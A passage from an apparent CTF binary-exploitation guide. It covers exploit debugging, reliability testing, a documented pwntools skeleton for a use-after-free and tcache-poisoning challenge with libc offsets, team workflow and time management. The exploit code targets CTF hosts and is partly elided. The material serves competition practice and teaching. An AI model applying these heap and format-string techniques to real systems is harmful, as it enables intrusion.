    log.info(f"{name}: {hex(addr)}")
    
    # Check page alignment for base addresses
    if 'base' in name.lower():
        assert addr & 0xfff == 0, f"{name} not page-aligned"
    
    # Verify address range
    if 'libc' in name.lower():
        assert 0x7f0000000000 < addr < 0x7fffffffffff, f"{name} invalid range"
    
    return addr

libc_base = validate_address(leak - offset, "libc_base")
system_addr = validate_address(libc_base + libc.symbols['system'], "system")
```

**Race Conditions and Timing Issues**

```python
# Add explicit synchronization
p.sendline(payload)
p.recvuntil(b'Expected output')  # Wait for confirmation

# Adjust timeouts for slow connections
p.recv(timeout=5)  # Increase timeout

# Detect timing-dependent failures
import time
start = time.time()
p.sendline(payload)
response = p.recv()
elapsed = time.time() - start
log.info(f"Response time: {elapsed:.2f}s")
```

### Differential Testing

**Compare Local vs Remote Behavior**

```python
def test_exploit(target_func):
    """Test exploit against local and remote targets"""
    results = {}
    
    # Local test
    log.info("Testing locally...")
    p_local = process('./binary')
    results['local'] = target_func(p_local)
    p_local.close()
    
    # Remote test
    log.info("Testing remote...")
    p_remote = remote('target.ctf', 1337, level='error')  # Suppress noise
    results['remote'] = target_func(p_remote)
    p_remote.close()
    
    # Compare results
    if results['local'] != results['remote']:
        log.warning("Local and remote behavior differs!")
        log.info(f"Local: {results['local']}")
        log.info(f"Remote: {results['remote']}")
    
    return results

# Usage
test_exploit(leak_canary_function)
```

**Version Compatibility Testing**

```bash
# Test against multiple libc versions
for libc in libc-2.27.so libc-2.31.so libc-2.35.so; do
    echo "Testing with $libc"
    LD_PRELOAD=./$libc python3 exploit.py local
done
```

### Exploit Stability Testing

**Reliability Verification**

```python
def test_reliability(iterations=10):
    """Test exploit success rate"""
    successes = 0
    
    for i in range(iterations):
        try:
            log.info(f"Attempt {i+1}/{iterations}")
            p = process('./binary')
            
            # Run exploit
            result = run_exploit(p)
            
            if b'flag{' in result:
                successes += 1
                log.success(f"Success {successes}/{i+1}")
            else:
                log.failure(f"Failed {i+1}")
            
            p.close()
            
        except Exception as e:
            log.error(f"Exception: {e}")
    
    success_rate = (successes / iterations) * 100
    log.info(f"Success rate: {success_rate:.1f}%")
    return success_rate

# Run reliability test
test_reliability(iterations=20)
```

**Handling Non-Deterministic Exploits**

```python
def bruteforce_exploit(max_attempts=1000):
    """For exploits with probabilistic success (e.g., partial overwrites)"""
    for attempt in range(max_attempts):
        try:
            p = remote('target.ctf', 1337)
            
            # Send exploit
            p.sendline(payload)
            
            # Check for success indicators
            result = p.recv(timeout=2)
            if b'flag{' in result or b'shell' in result:
                log.success(f"Success on attempt {attempt+1}")
                return result
            
            p.close()
            
        except EOFError:
            # Connection closed (likely crashed)
            continue
        except Exception as e:
            log.debug(f"Attempt {attempt+1} failed: {e}")
    
    log.failure(f"Failed after {max_attempts} attempts")
```

## Documentation Practices

### Code Documentation Standards

**Self-Documenting Exploit Structure**

```python
#!/usr/bin/env python3
"""
Challenge: heap_heaven
Category: Pwn
Points: 500
Author: Your Name

Vulnerability: Use-After-Free in delete_note() function
Exploitation: tcache poisoning → arbitrary write → __free_hook overwrite

Requirements:
- pwntools
- libc version 2.31

Usage:
    python3 exploit.py local   # Test locally
    python3 exploit.py remote  # Run against remote
"""

from pwn import *

# ============================================================================
# CONFIGURATION
# ============================================================================
BINARY_PATH = './heap_heaven'
LIBC_PATH = './libc-2.31.so'
REMOTE_HOST = 'ctf.example.com'
REMOTE_PORT = 1337

# Known offsets (obtained from analysis)
LIBC_MAIN_ARENA_OFFSET = 0x1ebbe0
LIBC_FREE_HOOK_OFFSET = 0x1eee48
ONE_GADGET_OFFSET = 0xe3b01  # execve("/bin/sh", rsp+0x50, environ)

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def alloc_note(p, size, data=b''):
    """Allocate note of specified size"""
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    if data:
        p.sendafter(b'Data: ', data)
    return int(p.recvline().strip().split()[-1])  # Return note ID

def delete_note(p, idx):
    """Delete note at index (vulnerable to UAF)"""
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit_note(p, idx, data):
    """Edit note content (exploits UAF)"""
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

# ============================================================================
# EXPLOITATION STAGES
# ============================================================================

def leak_libc_base(p):
    """
    Stage 1: Leak libc base address
    
    Strategy:
    1. Allocate chunk > 0x408 to bypass tcache
    2. Free chunk to place in unsorted bin
    3. Read freed chunk to leak fd pointer (points to main_arena)
    4. Calculate libc base from main_arena offset
    
    Returns: libc base address
    """
    log.info("Stage 1: Leaking libc base")
    
    # Create large chunk
    idx = alloc_note(p, 0x500, b'LEAK')
    
    # Free to unsorted bin
    delete_note(p, idx)
    
    # [Exploitation technique details]
    # ...
    
    log.success(f"Libc base: {hex(libc_base)}")
    return libc_base

# [Additional stages documented similarly]

# ============================================================================
# MAIN EXPLOIT
# ============================================================================

def exploit(p, libc_base):
    """Execute complete exploitation chain"""
    # [Implementation]
    pass

if __name__ == '__main__':
    # Parse arguments
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else 'local'
    
    # Setup
    elf = context.binary = ELF(BINARY_PATH)
    libc = ELF(LIBC_PATH)
    
    if target == 'local':
        p = process(BINARY_PATH)
    else:
        p = remote(REMOTE_HOST, REMOTE_PORT)
    
    # Execute exploit
    libc_base = leak_libc_base(p)
    exploit(p, libc_base)
    
    p.interactive()
```

### Analysis Documentation Template

**Markdown Analysis Notes**

````markdown
# Challenge: heap_heaven

## Initial Analysis
- **Binary protections**: NX, Full RELRO, PIE, Canary
- **Libc version**: 2.31 (tcache enabled)
- **Architecture**: x86-64

## Vulnerability Discovery

### Use-After-Free in delete_note()
```c
void delete_note(int idx) {
    free(notes[idx]);
    // Missing: notes[idx] = NULL;
    // Allows access to freed chunk
}
````

**Impact**: Can read/write freed chunk metadata (fd/bk pointers)

## Exploitation Strategy

### Phase 1: Information Leak

1. Allocate chunk > 0x408 (bypass tcache)
2. Free chunk → enters unsorted bin
3. Read freed chunk → leak fd pointer
4. Calculate libc base: `fd - 0x1ebbe0`

**Tested offsets**:

- `main_arena`: 0x1ebbe0 (verified on libc-2.31)
- `__free_hook`: 0x1eee48

### Phase 2: Tcache Poisoning

1. Allocate two 0x100 chunks (A, B)
2. Free A → enters tcache
3. Free B → enters tcache
4. UAF edit A: overwrite fd to `__free_hook - 0x10`
5. Allocate twice: second allocation returns `__free_hook`

**Tcache structure**:

```
tcache_perthread_struct:
  counts[0x100/0x10]: 2
  entries[0x100/0x10]: B → A → NULL (poisoned to __free_hook)
```

### Phase 3: Arbitrary Code Execution

1. Write one_gadget to `__free_hook`
2. Trigger free() → calls one_gadget → shell

**One-gadget constraints** (offset 0xe3b01):

- `[rsp+0x50] == NULL`
- Satisfied when free() is called from menu loop

## Challenges Encountered

1. **Initial tcache bypass**: Small allocations entered tcache, no libc leak
    - Solution: Use chunks > 0x408
2. **One-gadget constraints**: First two gadgets failed constraint checks
    - Solution: Found third gadget with looser constraints

## Flag

`flag{tcache_p01s0n1ng_1s_fun_1337}`

## References

- [how2heap tcache poisoning](https://github.com/shellphish/how2heap)
- Glibc 2.31 source: malloc/malloc.c

````

### Offset and Address Tracking

**Centralized Offset File**
```python
# offsets.py - Shared across exploit scripts
"""
Calculated offsets for heap_heaven challenge
Generated: 2025-10-19
Libc version: libc-2.31.so (Ubuntu GLIBC 2.31-0ubuntu9.9)
"""

# Libc offsets (from base)
LIBC_OFFSETS = {
    'main_arena': 0x1ebbe0,
    '__free_hook': 0x1eee48,
    '__malloc_hook': 0x1eeb70,
    'system': 0x52290,
    'execve': 0xe3b01,
    'str_bin_sh': 0x1b45bd,
}

# Binary offsets (from PIE base)
BINARY_OFFSETS = {
    'main': 0x1234,
    'win': 0x1337,
    'vulnerable_func': 0x1400,
}

# One-gadget constraints
ONE_GADGETS = [
    {'offset': 0xe3b01, 'constraint': '[rsp+0x50] == NULL'},
    {'offset': 0xe3b04, 'constraint': '[rsp+0x60] == NULL'},
    {'offset': 0xe3b08, 'constraint': 'rax == NULL'},
]

def calculate_address(base, offset_name, offset_dict):
    """Calculate absolute address from base + offset"""
    return base + offset_dict[offset_name]
````

Usage in exploit:

```python
from offsets import *

libc_base = leak_libc()
free_hook = calculate_address(libc_base, '__free_hook', LIBC_OFFSETS)
```

### Real-Time Documentation During CTF

**Quick Notes Template**

```bash
# Create timestamped note file
echo "# $(date '+%Y-%m-%d %H:%M:%S') - Initial observations" > notes.txt

# Append findings as you discover them
cat >> notes.txt << EOF

## Checksec output
$(checksec --file=./binary)

## Ghidra findings
- Main loop at 0x1234
- Vulnerable function at 0x1400
- Buffer overflow: read(0, buf, 0x200) into 0x100 buffer

## Memory leak at offset 15
$(python3 -c "print('%15\$p')" | ./binary)
Leaked: 0x7f1234567890 (looks like libc)

## Next steps
1. Identify libc version from leak
2. Calculate ROP gadgets
3. Test payload locally
EOF
```

## Team Collaboration in CTFs

### Division of Labor Strategies

**Role-Based Assignment**

```
Team roles for pwn challenge:

1. Reverse Engineer (1 person)
   - Decompile binary in Ghidra/IDA
   - Identify vulnerabilities
   - Document exploitation surface

2. Exploit Developer (1-2 people)
   - Write exploitation script
   - Debug and test locally
   - Adapt for remote target

3. Infrastructure (1 person)
   - Set up testing environment
   - Identify libc version
   - Find ROP gadgets/one-gadgets

4. Floater
   - Assist where needed
   - Test alternative approaches
   - Document progress
```

**Parallel Analysis Approach**

- Multiple team members independently analyze binary
- Compare findings after 15-30 minutes
- Prevents groupthink, catches missed vulnerabilities

### Communication Tools and Practices

**Discord/Slack Channel Structure**

```
#general           - Team coordination
#pwn-challenges    - Binary exploitation discussion
#web-challenges    - Web exploitation discussion
#crypto-challenges - Cryptography discussion
#solved            - Flag submissions and writeups
#notes             - Quick findings and observations
```

**Effective Status Updates**

```markdown
## [Challenge Name] Status Update

**Current stage**: Information leak working locally

**Blocker**: Remote connection times out after payload stage 2
- Hypothesis: Payload contains null bytes truncating input
- Testing: Encoding payload with different method

**Next steps**:
1. Test encoded payload locally
2. If successful, deploy to remote
3. Document for writeup

**Time estimate**: 20 minutes

**Help needed**: None currently / Someone review my ROP chain?
```

### Shared Resource Management

**Collaborative Exploit Template**

```python
#!/usr/bin/env python3
"""
Collaborative exploit for [challenge_name]
Team: [team_name]

Contributors:
- Alice: Reverse engineering, vulnerability identification
- Bob: Exploit development, stages 1-2
- Charlie: ROP chain construction, stage 3

Status: [In Progress / Testing / Working / Failed]
Last updated: 2025-10-19 14:30:00
"""

# ============================================================================
# TEAM FINDINGS - Update as analysis progresses
# ============================================================================

"""
VULNERABILITY: Buffer overflow in read_input() (Bob, 14:00)
- Location: main+0x123
- Overflow: 0x100 buffer, read(0x200)
- Overwrites: RBP at offset 264, RIP at offset 272

PROTECTIONS: (Alice, 14:15)
- NX: Enabled (need ROP)
- PIE: Enabled (need leak)
- Canary: Enabled (need leak)
- RELRO: Partial (GOT writable)

INFORMATION LEAK: (Bob, 14:30)
- Format string in printf(username) at main+0x80
- Stack offset 15: Contains libc address (__libc_start_main+231)
- Stack offset 17: Contains canary

EXPLOITATION APPROACH: (Team decision, 14:45)
1. Leak canary + libc via format string
2. ROP: ret2libc with leaked addresses
3. Bypass canary check with leaked value
"""

# ============================================================================
# TODO LIST - Assign and check off
# ============================================================================

"""
[x] Find vulnerability (Alice)
[x] Identify protections (Alice)
[x] Develop leak primitive (Bob)
[ ] Build ROP chain (Charlie) - IN PROGRESS
[ ] Test locally (Bob)
[ ] Test remote (Team)
[ ] Document writeup (Alice)
"""

# [Rest of exploit code]
```

**Git-Based Collaboration**

```bash
# Repository structure for team CTF
ctf-competition/
├── challenges/
│   ├── pwn-challenge1/
│   │   ├── exploit.py
│   │   ├── analysis.md
│   │   └── files/
│   ├── web-challenge1/
│   └── crypto-challenge1/
├── tools/
│   ├── one_gadget_finder.py
│   └── libc_identifier.py
└── README.md

# Commit conventions
git commit -m "[pwn-challenge1] Add stage 1 leak primitive"
git commit -m "[pwn-challenge1] SOLVED - Flag captured"

# Branch per challenge for parallel work
git checkout -b pwn-challenge1-rop-chain
```

### Knowledge Sharing During Competition

**Quick Reference Documentation**

```bash
# Create team cheatsheet as challenges are solved
cat >> team_cheatsheet.md << EOF

## Format String Offset Finder (pwn-challenge1)
\`\`\`python
for i in range(1, 50):
    print(f"%{i}\$p")
\`\`\`

## Libc Identifier (pwn-challenge2)
\`\`\`bash
libc-database/identify puts 0x7f... system 0x7f...
\`\`\`

## One-Gadget Constraints Checker (pwn-challenge3)
\`\`\`bash
# Test constraint satisfaction in GDB
gef➤ x/gx \$rsp+0x50  # Check if NULL for gadget
\`\`\`
EOF
```

**Post-Solve Debriefing**

```markdown
## Challenge: heap_heaven [SOLVED]

**Solver**: Bob
**Time**: 45 minutes
**Points**: 500

**Key techniques used**:
- Tcache poisoning for arbitrary write
- UAF to leak libc base
- One-gadget for clean shell

**Lessons learned**:
- Always test multiple one-gadgets (first two failed constraints)
- Allocations > 0x408 bypass tcache for reliable libc leaks
- GDB scripting speeds up heap debugging significantly

**Reusable components**:
- `tcache_poison.py` helper function → added to tools/
- UAF leak primitive → documented in team_cheatsheet.md
```

### Handling Conflicts and Duplicated Effort

**Challenge Assignment System**

```markdown
# challenges_status.md (live document)

| Challenge | Category | Points | Assigned | Status | Blocker |
|-----------|----------|--------|----------|--------|---------|
| baby_pwn | Pwn | 100 | Alice | Solved | - |
| heap_heaven | Pwn | 500 | Bob | Testing | Remote timing |
| format_fun | Pwn | 300 | - | Open | - |
| crypto1 | Crypto | 400 | Charlie | In Progress | - |

**Assignment protocol**:
1. Update status to "Assigned" when starting
2. Update to "Testing" when exploit works locally
3. Update to "Solved" when flag captured
4. If blocked >30min, update "Blocker" and ask for help
```

**Conflict Resolution**

```
If two team members work on same challenge:
1. Compare approaches (maybe one is better)
2. If both viable, pick approach closest to completion
3. Other person switches to next priority challenge
4. Document both approaches for writeup (shows depth)
```

## Time Management During Competitions

### Challenge Prioritization Framework

**Point-per-Effort Analysis**

```markdown
## Challenge Triage (First 30 minutes)

Quick scan of all challenges:

| Challenge | Points | Est. Difficulty | Est. Time | Priority Score |
|-----------|--------|----------------|-----------|----------------|
| baby_pwn | 100 | Easy | 15min | 6.67 pts/min |
| heap_heaven | 500 | Hard | 90min | 5.56 pts/min |
| format_fun | 300 | Medium | 45min | 6.67 pts/min |
| impossible | 1000 | Extreme | 180min | 5.56 pts/min |

**Strategy**: 
1. Solve baby_pwn + format_fun first (high points/min)
2. Then attempt heap_heaven
3. Only tackle impossible if ahead on leaderboard
```

**Dynamic Blood Bonus Consideration**

```python
# Some CTFs give first-solve bonuses
base_points = 500
first_blood_bonus = 100  # Additional points for first solve

# Decision: If challenge seems solvable quickly, prioritize for bonus
if estimated_time < 30 and solve_count == 0:
    priority = "HIGH - First blood opportunity"
```

### Time-Boxing Strategies

**Strict Time Limits**

```markdown
## Challenge Time-Box Policy

**Initial attempt**: 45 minutes maximum
- If no clear path to solution after 45min → STOP
- Document findings and move to next challenge
- Return later with fresh perspective or if teammate helps

**Exceptions**:
- If 90% complete (e.g., exploit works locally, just needs remote tuning)
- If challenge is final blocker for category completion

**Warning signs to stop**:
- Repeatedly testing same approach hoping for different result
- No new information gained in last 20 minutes
- Frustration level increasing
```

**Pomodoro for CTF**

```
Modified Pomodoro Technique:

- 45min focused work on challenge
- 5min break: Check team progress, review other challenges
- After 2 cycles (90min), mandatory 15min break
- During break: Discuss blockers with team, review leaderboard

Benefits:
- Prevents tunnel vision on unsolvable challenges
- Regular sync points with team
- Maintains energy over 24-48hr competitions
```

### Progress Tracking During Competition

**Personal Progress Log**

```bash
# Timestamped log of activities
cat >> my_progress.log << EOF
14:00 - Started pwn-challenge1 analysis
14:15 - Found buffer overflow, checksec shows NX+PIE
14:30 - Developed format string leak, testing locally
14:45 - Leak works! Moving to ROP chain construction
15:00 - ROP chain complete, testing full exploit
15:15 - Local exploit works consistently
15:30 - Remote exploit works! FLAG CAPTURED
15:35 - Documenting exploit for writeup
15:45 - Starting next challenge: heap_heaven
EOF
```

**Team Progress Dashboard**

```markdown
# team_dashboard.md (Update every hour)

## Current Status (15:00)

**Solved**: 3/10 challenges (1200 points)
**In Progress**: 2 challenges
**Blocked**: 1 challenge (needs libc version identification)

**Team members**:
- Alice: Working on web-challenge2 (30min in)
- Bob: Just solved pwn-challenge1 → Moving to crypto1
- Charlie: Blocked on heap_heaven (needs help with tcache)

**Next priority**: 
- Bob help Charlie with heap challenge (15 min)
- Then Bob → crypto1, Charlie finishes heap_heaven

**Leaderboard position**: 8th place (50 points behind 7th)
```

### Avoiding Common Time Traps

**Rabbit Hole Detection**

```markdown
## Warning Signs You're in a Rabbit Hole

1. **No new information**: Testing same thing repeatedly
   - Solution: Step back, review notes, try different approach

2. **Scope creep**: Original plan was "simple ret2libc", now attempting "custom heap allocator exploit"
   - Solution: Return to simplest viable approach

3. **Assumption fixation**: "This MUST be a heap challenge" (maybe it's not)
   - Solution: Verify assumptions, consider alternative vulnerability types

4. **Tool fighting**: Spending 30min debugging pwntools issue instead of writing raw socket code
   - Solution: If tool doesn't work in 10min, use alternative method

5. **Perfect exploit syndrome**: Trying to make exploit 100% reliable when 80% is sufficient
   - Solution: If exploit works 4/5 times, run it 5 times and move on
```

**The 15-Minute Rule**

```
If stuck on a specific technical problem >15 minutes:

1. Ask teammate for fresh perspective (5 min pairing)
2. Search for similar CTF challenge writeups (10 min research)
3. Post question in CTF Discord with specific details
4. Move to different subtask while waiting for help

Example:
- Stuck: "My ROP chain crashes at gadget 3"
- Move to: Finish writeup for previous challenge
- Or: Help teammate with their challenge
- Return: When teammate/community responds with suggestion
```

### Competition Phase Strategies

**Opening Phase (First 2 hours)**

```markdown
## Goals
- Solve 2-3 easy challenges (build momentum + points)
- Triage all challenges (identify priorities)
- Set up infrastructure (testing environments, tools)

## Anti-patterns
- Spending 1hr on hard challenge right away
- Perfectionist approach to easy challenges
- Working in isolation without team communication
```

**Mid-Competition (Hours 3-20)**

```markdown
## Goals
- Focus on medium-difficulty challenges
- Collaborate on hard challenges (pair programming)
- Maintain steady solving rate

## Time allocation
- 60% exploitation work
- 20% helping teammates (force multiplier)
- 10% breaks and mental reset
- 10% writeup documentation (don't defer to end)
```

**Final Hours (Last 4 hours)**

```markdown
## Priorities
1. Complete in-progress challenges (capture low-hanging fruit)
2. Attempt first blood opportunities if near completion
3. Review challenge list for overlooked easy problems
4. Finalize writeups (required for some CTFs)

## Avoid
- Starting new complex challenges
- Major exploit rewrites (use working exploit even if ugly)
- Perfectionism (submit working solution, iterate if time remains)
```

### Energy and Focus Management

**Physical Considerations**

```markdown
## Maintaining Performance

**Nutrition**:
- Pre-prepare meals/snacks (avoid mid-CTF cooking time sink)

- Avoid sugar crashes: protein + complex carbs
- Hydration: Keep water at desk, set hourly reminders
- Caffeine strategy: Moderate consumption, avoid dependency/crashes

**Sleep** (for 48hr+ CTFs):

- **Never skip sleep entirely** - 4hrs sleep > 0hrs (cognitive function drops dramatically)
- Power naps: 20-30min naps restore focus effectively
- Sleep scheduling: Plan 4-6hr sleep block during low-activity period (3am-7am typical)
- Handoff protocol: Document progress before sleeping so teammate can continue

**Physical breaks**:

- Stand/stretch every 60-90 minutes (prevents RSI, maintains circulation)
- 5-minute walks between challenges (mental reset + physical movement)
- Eye strain prevention: 20-20-20 rule (every 20min, look 20ft away for 20sec)

````

**Mental Performance Optimization**
```markdown
## Focus Techniques

**Context switching cost**:
- Switching between challenges takes 10-15min to rebuild mental model
- Minimize switches: Work 45-90min blocks on single challenge
- Exception: Quick "sanity check" tasks (5min) don't break flow

**Peak performance windows**:
- Track personal productivity: Some people peak morning, others evening
- Schedule hardest challenges during your peak hours
- Use lower-energy periods for: documentation, tool setup, easy challenges

**Frustration management**:
If stuck and frustrated:
1. Take immediate 5min break (walk, stretch, different room)
2. Explain problem out loud to teammate (rubber duck debugging)
3. Switch to completely different challenge category (context reset)
4. Return after 30-60min with fresh perspective

**Flow state preservation**:
- When in flow, protect it: mute notifications, decline interruptions
- Exception: Critical team updates or competition announcements
- Inform team: "In flow on crypto1, check back in 45min"
````

### Exploit Development Time Estimation

**Estimation Framework**

```python
# Time estimation model for pwn challenges

def estimate_time(challenge):
    """
    Estimate time required based on challenge characteristics
    [Inference] Based on typical CTF experience patterns
    """
    base_time = {
        'easy': 15,      # minutes
        'medium': 45,
        'hard': 90,
        'extreme': 180
    }
    
    time = base_time.get(challenge['difficulty'], 60)
    
    # Modifiers
    if challenge['has_source_code']:
        time *= 0.7  # Source code speeds up analysis significantly
    
    if challenge['protections']['PIE'] and challenge['protections']['ASLR']:
        time *= 1.3  # Information leaks add complexity
    
    if challenge['libc_provided']:
        time *= 0.8  # Known offsets easier than identification
    else:
        time += 15   # Add time for libc version identification
    
    if challenge['category'] == 'heap':
        time *= 1.4  # Heap exploitation typically more complex
    
    return int(time)

# Example usage
challenge = {
    'difficulty': 'medium',
    'has_source_code': False,
    'protections': {'PIE': True, 'ASLR': True, 'NX': True},
    'libc_provided': True,
    'category': 'stack'
}

estimated = estimate_time(challenge)
print(f"Estimated time: {estimated} minutes")
```

**Checkpoint-Based Progress Tracking**

```markdown
## Exploitation Milestones

Typical pwn challenge breakdown:

| Phase | Task | Est. Time | Completion Marker |
|-------|------|-----------|-------------------|
| 1 | Initial analysis | 10min | Vulnerability identified |
| 2 | Protection analysis | 5min | Checksec complete, strategy chosen |
| 3 | Information leak | 20min | Leak working locally |
| 4 | Exploit development | 30min | Local shell achieved |
| 5 | Remote adaptation | 15min | Remote shell achieved |
| 6 | Documentation | 10min | Writeup complete |

**Total**: ~90 minutes for medium difficulty

**Progress tracking**:
- If Phase 3 takes >30min → Re-evaluate approach
- If Phase 4 takes >45min → Consider alternative exploitation method
- If Phase 5 fails repeatedly → Check remote environment differences
```

### Team Synchronization Timing

**Scheduled Check-ins**

```markdown
## Team Sync Protocol

**Hourly sync** (5 minutes):
- Quick status updates from each member
- Identify blockers that need immediate help
- Adjust priorities based on leaderboard/team progress

**Mid-competition sync** (15 minutes, at competition midpoint):
- Detailed review of remaining challenges
- Reassign resources based on current standing
- Identify "must-solve" challenges for target placement

**Format for sync**:
Each person reports:
1. Current task (1 sentence)
2. Progress percentage (0-100%)
3. Estimated completion time
4. Blockers (if any)
5. Help needed (specific request or "none")

Example:
"Working on heap_heaven, 60% done, ~20min remaining, no blockers, need someone to test remote connection afterwards"
```

**Async Communication Standards**

```markdown
## Message Formatting for Speed

**Flag captures** (immediate notification):
@everyone FLAG CAPTURED: pwn-challenge1 (300pts)
Total: 1200pts, Position: 8th → 6th

**Blockers** (request for help):
@team BLOCKED: heap_heaven
Issue: Remote exploit timing out after stage 2
Tried: Adjusted sleep(), increased timeout, encoded payload
Need: Fresh eyes on payload or network debugging

**Progress updates** (keep team informed):
pwn-challenge3 → 75% complete, ROP chain working locally, testing remote

**Findings** (share knowledge):
TIP: This CTF's remote connections require \n\n (double newline) between stages
```

### Managing Multiple Simultaneous Exploits

**Parallel Development Strategy**

```bash
# Terminal multiplexer setup for multiple challenges
tmux new-session -s ctf

# Window per challenge
tmux new-window -n pwn1
tmux new-window -n pwn2
tmux new-window -n web1

# Pane layout per window
tmux split-window -h  # Left: exploit script, Right: GDB/testing
tmux split-window -v  # Bottom right: notes/documentation
```

**Context Management**

```python
# Save exploit state for quick context switching

import pickle
import sys

STATE_FILE = f".exploit_state_{sys.argv[0]}"

def save_state(state_dict):
    """Save current exploit state for later resumption"""
    with open(STATE_FILE, 'wb') as f:
        pickle.dump(state_dict, f)
    print(f"[*] State saved to {STATE_FILE}")

def load_state():
    """Load previously saved state"""
    try:
        with open(STATE_FILE, 'rb') as f:
            return pickle.load(f)
    except FileNotFoundError:
        return {}

# Usage in exploit
if __name__ == '__main__':
    state = load_state()
    
    if 'libc_base' not in state:
        # Run leak stage
        state['libc_base'] = leak_libc()
        state['canary'] = leak_canary()
        save_state(state)
        print("[*] Leaks complete. Proceed to exploitation stage.")
        sys.exit(0)
    
    # Resume from saved state
    libc_base = state['libc_base']
    canary = state['canary']
    exploit(libc_base, canary)
```

### Writeup Time Management

**During-Competition Documentation**

````markdown
## Real-Time Writeup Template

Document as you solve (saves 30-60min at end):

### Challenge: heap_heaven

**Time started**: 14:00
**Time solved**: 15:30
**Total time**: 90 minutes

#### Quick Notes
- 14:00: Started analysis, found UAF in delete_note()
- 14:15: Leaked libc via unsorted bin fd pointer
- 14:30: Tcache poisoning working locally
- 14:45: One-gadget constraints issue (tried 3 gadgets)
- 15:00: Found working gadget, building final exploit
- 15:15: Local exploit stable (5/5 success)
- 15:30: Remote shell! Flag captured

#### Exploitation Summary
[Fill in details after flag capture - 10min]

#### Key Code Snippets
```python
# Save working code blocks as you write them
def leak_libc(p):
    # [Working leak code]
    pass
````

#### Lessons Learned

- One-gadget testing in GDB saved time vs trial-and-error
- Large chunk allocation (>0x408) necessary for unsorted bin leak

````

**Post-Competition Writeup Finalization**
```markdown
## Writeup Completion Priority

If time constrained at competition end:

**Must include** (5 min per challenge):
- Vulnerability description
- Exploitation approach (high-level)
- Final exploit script
- Flag

**Nice to have** (15 min per challenge):
- Detailed step-by-step walkthrough
- Alternative approaches considered
- Debugging process and challenges
- Educational content for others

**Optional** (30+ min per challenge):
- Video demonstration
- Detailed GDB traces
- Source code annotations
- Challenge author interview/insights
````

### Recovery from Setbacks

**Failed Exploit Response Protocol**

```markdown
## When Exploit Fails After Significant Time Investment

**Immediate response** (don't waste more time):
1. Document everything you tried (5min)
2. Save all code/notes for later review
3. Post technical details in team channel (someone may spot issue)
4. Move to different challenge immediately

**Example documentation**:
---
Challenge: impossible_pwn
Time invested: 2 hours
Status: Failed - local exploit works, remote times out

Approaches tried:
1. Standard ROP chain → crashes at gadget 3
2. ret2libc → system() address incorrect (wrong libc version?)
3. Heap exploitation → can't trigger vulnerability reliably

Blockers:
- Can't identify remote libc version (no leaks working)
- Socket closes after first payload stage
- GDB behavior differs from remote

Next steps if revisited:
- Try alternative leak methods (GOT dereferencing?)
- Check if remote has rate limiting/WAF
- Verify network encoding (binary vs text mode)
---

**Return criteria**:
- Another team member has fresh insight
- You solve similar challenge and gain new technique
- Competition nearing end and it's final unsolved in category
```

**Mental Reset Techniques**

```markdown
## Recovering from Frustration

**Quick resets** (5 minutes):
- Physical: Walk outside, stretch, pushups
- Mental: Explain problem to non-technical person (forces clarity)
- Perspective: Check leaderboard (maybe challenge isn't critical)

**Medium resets** (15 minutes):
- Work on completely different category
- Help teammate with their challenge (teaching reinforces knowledge)
- Review solved challenges (rebuild confidence)

**Full reset** (30-60 minutes):
- Meal break with team (away from computers)
- Power nap if sleep-deprived
- Recreation: Quick game, music, socialization

**When to reset**:
- Repeatedly testing identical approach expecting different results
- Physical tension (jaw clenching, hunched posture)
- Emotional response to technical problems ("this is impossible!", "I hate this")
- Diminishing returns (30min with zero progress)
```

### Competition Endgame Strategy

**Final 60 Minutes**

```markdown
## Last Hour Checklist

**Priority 1**: Complete in-progress challenges
- Review all challenges >80% complete
- Focus team resources on closest to completion
- Accept imperfect exploits (if it works 50%, run it multiple times)

**Priority 2**: Low-hanging fruit scan
- Re-check easy challenges: Did you miss something obvious?
- Look for challenges with 0 solves that increased points (dynamic scoring)
- Check for hints/updates posted by organizers

**Priority 3**: Writeup submission (if required)
- Ensure all flags submitted properly
- Quick writeup for any challenges requiring explanation
- Verify submission format (some CTFs have specific requirements)

**DO NOT**:
- Start new complex challenges
- Rewrite working exploits for elegance
- Argue with teammates about approach (just try fastest option)
- Give up early (competition runs until 0:00:00)
```

**Score Optimization**

```markdown
## Final Score Maximization

**Dynamic scoring systems**:
- Challenge points decrease as more teams solve them
- Strategy: Solve unpopular challenges early for maximum points
- Check if near completion on unsolved challenges (potential high value)

**Partial points** (if offered):
- Some CTFs give partial credit for writeups even without flag
- Document your approach and submit
- Explain vulnerability + exploitation theory + what blocked you

**First blood bonuses**:
- If you're close on unsolved challenge, push for completion
- Coordinate with team: focus all resources on single first-blood attempt
- Only worthwhile if very close (>90% complete)
```

### Post-Competition Analysis

**Time Efficiency Review**

```markdown
## Post-CTF Team Retrospective

**What worked well**:
- Quick triage at start (solved 3 easy challenges in first hour)
- Pair programming on hard heap challenge (solved 30min faster than solo)
- Regular sync meetings kept everyone informed

**What didn't work**:
- Spent 90min on "red_herring" challenge (was intentionally unsolvable)
- Poor communication led to duplicate work on pwn-challenge3
- Didn't take adequate breaks (performance dropped after hour 8)

**Time allocation analysis**:
| Activity | Time Spent | Points Gained | Efficiency |
|----------|------------|---------------|------------|
| Easy challenges | 1.5 hrs | 400 pts | 267 pts/hr |
| Medium challenges | 4 hrs | 1200 pts | 300 pts/hr |
| Hard challenges | 3 hrs | 500 pts | 167 pts/hr |
| Failed attempts | 2 hrs | 0 pts | 0 pts/hr |
| Breaks/overhead | 1.5 hrs | N/A | N/A |

**Lessons for next CTF**:
1. Stricter time-boxing on hard challenges (45min max initial attempt)
2. Better challenge assignment system (avoid duplicate work)
3. Mandatory breaks every 90 minutes (maintain performance)
4. Earlier pivot from failed attempts (2hrs on unsolvable challenge was too much)
```

**Personal Performance Metrics**

```python
# Track personal CTF statistics for improvement

import json
from datetime import datetime

CTF_LOG = "ctf_performance.json"

def log_challenge(challenge_data):
    """Log challenge completion for later analysis"""
    entry = {
        'date': datetime.now().isoformat(),
        'challenge_name': challenge_data['name'],
        'category': challenge_data['category'],
        'difficulty': challenge_data['difficulty'],
        'time_spent_minutes': challenge_data['time'],
        'points': challenge_data['points'],
        'solved': challenge_data['solved'],
        'techniques_used': challenge_data['techniques'],
